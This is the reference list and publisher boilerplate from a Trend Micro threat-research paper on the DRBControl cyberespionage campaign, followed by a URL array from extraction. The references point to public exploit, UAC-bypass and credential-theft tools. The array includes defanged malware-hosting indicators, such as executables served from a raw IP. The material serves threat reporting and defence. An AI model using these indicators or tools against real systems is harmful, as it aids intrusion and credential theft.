\u201cUpdate on Pawn Storm: New Targets and Politically Motivated \n\nCampaigns.\u201d Last accessed on 20 January 2020 at https://blog.trendmicro.com/trendlabs-security-intelligence/update-pawn-\n\nstorm-new-targets-politically-motivated-campaigns/.\n\n3  The MITRE Corporation. (n.d.). MITRE ATT&CK. \u201cDLL Side-Loading.\u201d Last accessed on 20 January 2020 at https://attack.\n\nmitre.org/techniques/T1073/.\n\n4  Dwight Hohnstein. (18 April 2019). SpecterOps. \u201cLateral Movement \u2014 SCM and DLL Hijacking Primer.\u201d Last accessed on 20 \n\nJanuary 2020 at https://posts.specterops.io/lateral-movement-scm-and-dll-hijacking-primer-d2f61e8ab992.\n\n5  Cl\u00e9ment Labro. (5 October 2018). GitHub, Inc. \u201cWindows IKEEXT DLL Hijacking Exploit Tool.\u201d Last accessed on 22 January \n\n2020 at https://github.com/itm4n/Ikeext-Privesc.\n\n6 \n\nImmuniWeb. (8 October 2012). ImmuniWeb. \u201cPrivilege Escalation Vulnerability in Microsoft Windows.\u201d Last accessed on 23 \n\nJanuary 2020 at https://www.immuniweb.com/advisory/HTB23108.\n\n7  Lawrence Abrams. (15 November 2016). Bleeping Computer. \u201cCryptoLuck Ransomware being Malvertised via RIG-E Exploit \n\nKits.\u201d Last accessed on 23 January 2020 at https://www.bleepingcomputer.com/news/security/cryptoluck-ransomware-being-\n\nmalvertised-via-rig-e-exploit-kits/.\n\n8  ThreatRecon Team. (25 July 2019). NSHC RedAlert Labs. \u201c The Growth of SectorF01 Group\u2019s Cyber Espionage Activities.\u201d \n\nLast accessed on 23 January 2020 at https://threatrecon.nshc.net/2019/07/25/growth-of-sectorf01-groups-cyber-espionage-\n\nactivities/.\n\n9  Microsoft Corporation. (February 2015). Microsoft. \u201cCumulative Security Update for Internet Explorer 11 for Windows 7 for \n\nx64-based Systems (KB3021952).\u201d Last accessed on 20 January 2020 at https://www.microsoft.com/en-US/download/details.\n\naspx?id=45761.\n\n10  Trend Micro. (16 October 2019). Trend Micro Security News. \u201cWinnti Group Resurfaces with PortReuse Backdoor, Now \n\nEngages in Illicit Cryptocurrency Mining.\u201d Last accessed on 20 January 2020 at https://www.trendmicro.com/vinfo/us/security/\n\nnews/cyber-attacks/winnti-group-resurfaces-with-portreuse-backdoor-now-engages-in-illicit-cryptocurrency-mining.\n\n11  The MITRE Corporation. (n.d.). MITRE ATT&CK. \u201cHyperBro.\u201d Last accessed on 20 January 2020 at https://attack.mitre.org/\n\nsoftware/S0398/.\n\n12  Robert Falcone. (28 May 2019). Palo Alto Networks, Inc. \u201cEmissary Panda Attacks Middle East Government Sharepoint \n\nServers.\u201d Last accessed on 20 January 2020 at https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-\n\ngovernment-sharepoint-servers/.\n\n13  Rootkiter. (3 January 2019). GitHub, Inc. \u201cTool for tunnel.\u201d Last accessed on 20 January 2020 at https://github.com/rootkiter/\n\nEarthWorm.\n\n14  My IP. (n.d.). My IP. Last accessed on 20 January 2020 at http://myip.com.tw/.\n\n15  MDSec Research. (7 December 2016). GitHub, Inc. \u201cInvoke-CredHunter.ps1.\u201d Last accessed on 20 January 2020 at https://\n\ngithub.com/mdsecresearch/Publications/blob/master/tools/redteam/psh/Invoke-CredHunter.ps1.\n\n16  SecWiki. (31 July 2017). GitHub, Inc. \u201cCVE-2017-0213.cpp.\u201d Last accessed on 20 January 2020 at https://github.com/SecWiki/\n\nwindows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213.cpp.\n\n17  BlackYe. (3 May 2014). GitHub, Inc. \u201cReadPsw.cpp.\u201d Last accesed on 20 January 2020 at https://github.com/blackye/remote_\n\ncontrol/blob/master/Server/ReadPsw.cpp.\n\n18  Rapid7. (24 July 2017). GitHub, Inc. \u201c enum_cred_store.rb.\u201d Last accessed on 20 January 2020 at https://github.com/rapid7/\n\nmetasploit-framework/blob/master/modules/post/windows/gather/credentials/enum_cred_store.rb.\n\n19  Cl\u00e9ment Lavoillotte. (15 September 2017). Almond. \u201cUAC bypass via elevated .NET applications.\u201d Last accessed on 20 \n\nJanuary 2020 at https://offsec.provadys.com/UAC-bypass-dotnet.html.\n\n20  Rapid7. (28 February 2014). GitHub, Inc. \u201cWin7Elevate_Inject.cpp.\u201d Last accessed on 20 January 2020 at https://github.com/\n\nrapid7/metasploit-framework/blob/master/external/source/exploits/bypassuac/Win7Elevate/Win7Elevate_Inject.cpp.\n\n36 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\f21  Matt Nelson. (15 August 2016). enigma0x3. \u201c\u2019Fileless\u2019 UAC Bypass Using Eventvwr.Exe And Registry Hijacking.\u201d Last accessed \n\non 20 January 2020 at https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/.\n\n22  Russell Nolen, Sarah Miller, and Rico Valdez. (28 April 2016). Carbon Black, Inc. \u201cThreat Advisory: \u201cSquiblydoo\u201d Continues \n\nTrend of Attackers Using Native OS Tools to \u201cLive off the Land\u201d.\u201d Last accessed 20 January 2020 at https://www.carbonblack.\n\ncom/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/.\n\n23  Trend Micro. (19 April 2017). Trend Micro. \u201cOf Pigs and Malware: Examining a Possible Member of the Winnti Group.\u201d Last \n\naccessed on 20 January 2020 at https://blog.trendmicro.com/trendlabs-security-intelligence/pigs-malware-examining-\n\npossible-member-winnti-group/.\n\n24  Tom Hegel. (3 May 2018). 401TRG. \u201cBurning Umbrella: An Intelligence Report on the Winnti Umbrella and Associated State-\n\nSponsored Attackers.\u201d Last accessed on 20 January 2020 at https://401trg.com/burning-umbrella/.\n\n25  ClearSky Research Team. (18 July 2017). ClearSky Cyber Security. \u201cRecent Winnti Infrastructure and Samples.\u201d Last accessed \n\non 20 January 2020 at https://www.clearskysec.com/winnti/.\n\n26  Denis Legezo. (13 June 2018). AO Kaspersky Lab. \u201cLuckyMouse hits national data center to organize country-level waterholing \n\ncampaign.\u201d Last accessed on 20 January 2020 at https://securelist.com/luckymouse-hits-national-data-center/86083/.\n\n27  Robert Falcone. (28 May 2019). Palo Alto Networks, Inc. \u201cEmissary Panda Attacks Middle East Government Sharepoint \n\nServers.\u201d Last accessed on 20 January 2020 at https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-\n\ngovernment-sharepoint-servers/.\n\n28  Trend Micro Incorporated. (n.d.). Trend Micro. \u201cAdvanced Threat Protection.\u201d Last accessed on 6 February 2020 at https://\n\nwww.trendmicro.com/en_us/business/products/network/advanced-threat-protection.html.\n\n29  Weimen Wu. (20 February 2015). Trend Micro. \u201cDeploying a Smart Sandbox for Unknown Threats and Zero-Day Attacks.\u201d Last \n\naccessed on 6 February 2020 at https://blog.trendmicro.com/trendlabs-security-intelligence/deploying-a-smart-sandbox-for-\n\nunknown-threats-and-zero-day-attacks/.\n\n30  Jon Oliver. (12 July 2018). Trend Micro Security News. \u201cRising Above Spam and Other Threats via Machine Learning.\u201d Last \n\naccessed on 6 February 2020 at https://www.trendmicro.com/vinfo/us/security/news/security-technology/rising-above-spam-\n\nand-other-threats-via-machine-learning.\n\n31  Trend Micro Incorporated. (n.d.). Trend Micro. \u201cSmart Protection Suites.\u201d Last accessed on 6 February 2020 at https://www.\n\ntrendmicro.com/en_us/business/products/user-protection/sps.html.\n\n32  Trend Micro Incorporated. (n.d.). Trend Micro. \u201cWorry-Free Services Advanced.\u201d Last accessed on 6 February 2020 at https://\n\nwww.trendmicro.com/en_us/small-business/worry-free-services-advanced.html.\n\n33  Trend Micro Incorporated. (n.d.). Trend Micro. \u201cAdvanced Threat Protection.\u201d Last accessed on 6 February 2020 at https://\n\nwww.trendmicro.com/en_us/business/products/network/advanced-threat-protection.html.\n\n34  Trend Micro Incorporated. (n.d.). Trend Micro. \u201cHybrid Cloud Security.\u201d Last accessed on 6 February 2020 at https://www.\n\ntrendmicro.com/en_us/business/products/hybrid-cloud.html.\n\n35  Trend Micro Incorporated. (n.d.). Trend Micro. \u201cSmart Protection Suites.\u201d Last accessed on 6 February 2020 at https://www.\n\ntrendmicro.com/en_us/business/products/user-protection/sps.html.\n\n36  Trend Micro Incorporated. (n.d.). Trend Micro. \u201cAll Solutions.\u201d Last accessed on 6 February 2020 at https://www.trendmicro.\n\ncom/en_us/business/products/all-solutions.html.\n\n37  Trend Micro Incorporated. (n.d.). Trend Micro. \u201cSmart Protection Suites.\u201d Last accessed on 6 February 2020 at https://www.\n\ntrendmicro.com/en_us/business/products/user-protection/sps.html.\n\n37 | Uncovering DRBControl: Inside the Cyberespionage Campaign Targeting Gambling Operations\n\n\fTREND MICROTM RESEARCH\n\nTrend Micro, a global leader in cybersecurity, helps to make the world safe for exchanging digital information. \n\nTrend Micro Research is powered by experts who are passionate about discovering new threats, sharing key insights, and supporting \n\nefforts to stop cybercriminals. Our global team helps identify millions of threats daily, leads the industry in vulnerability disclosures, \n\nand publishes innovative research on new threat techniques. We continually work to anticipate new threats and deliver thought-\n\nprovoking research.  \n\nwww.trendmicro.com\n\n\u00a92020 by Trend Micro, Incorporated. All rights reserved. Trend Micro and the Trend Micro t-ball logo are trademarks or registered trademarks of Trend Micro, Incorporated. All other product or company names may be trademarks or registered trademarks of their owners.\f"], "URLs": ["https://securelist.com/luckymouse-hits-national-data-center/86083/.", "https://www.bleepingcomputer.com/news/security/cryptoluck-ransomware-being-", "https://attack.", "http://myip.com.tw/.", "https://github.com/itm4n/Ikeext-Privesc.", "https://blog.trendmicro.com/trendlabs-security-intelligence/deploying-a-smart-sandbox-for-", "https://github.com/blackye/remote_", "https://www.clearskysec.com/winnti/.", "https://blog.trendmicro.com/trendlabs-security-intelligence/update-pawn-", "https://offsec.provadys.com/UAC-bypass-dotnet.html.", "https://threatrecon.nshc.net/2019/07/25/growth-of-sectorf01-groups-cyber-espionage-", "https://github.com/SecWiki/", "https://github.com/", "http://185.173.92[.]141:33579/t32d.exe", "https://www.immuniweb.com/advisory/HTB23108.", "https://github.com/rapid7/", "https://github.com/rootkiter/", "https://posts.specterops.io/lateral-movement-scm-and-dll-hijacking-primer-d2f61e8ab992.", "https://401trg.com/burning-umbrella/.", "https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-", "https://blog.trendmicro.com/trendlabs-security-intelligence/pigs-malware-examining-", "http://185.173.92[.]141:33579/i610.exe", "https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/.", "http://www.imr.co[.]kr/upload/info[.]cab", "https://www.microsoft.com/en-US/download/details."], "weight": 0.0}